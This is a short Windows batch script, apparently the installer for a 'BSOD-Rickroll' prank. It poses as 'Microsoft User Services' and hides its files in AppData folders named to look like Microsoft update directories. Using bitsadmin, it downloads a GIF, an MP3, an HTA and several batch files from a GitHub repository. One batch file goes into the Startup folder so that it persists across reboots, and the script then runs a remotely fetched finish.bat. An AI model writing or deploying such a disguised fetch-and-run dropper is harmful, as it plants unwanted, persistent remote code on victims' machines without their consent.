@echo off

cls
title Microsoft User Services
mkdir "%AppData%\Microsoft\Update\User\Services"

bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Storage/msrkl.gif" "%AppData%\Microsoft\Update\User\Services\msrkl.gif"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Storage/msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Storage/msrklbg.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Storage/msrkl.hta" "%AppData%\Microsoft\Update\msrkl.hta"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Storage/msrkl.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"

bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Online/finish.bat" "%AppData%\finish.bat"
start finish.bat
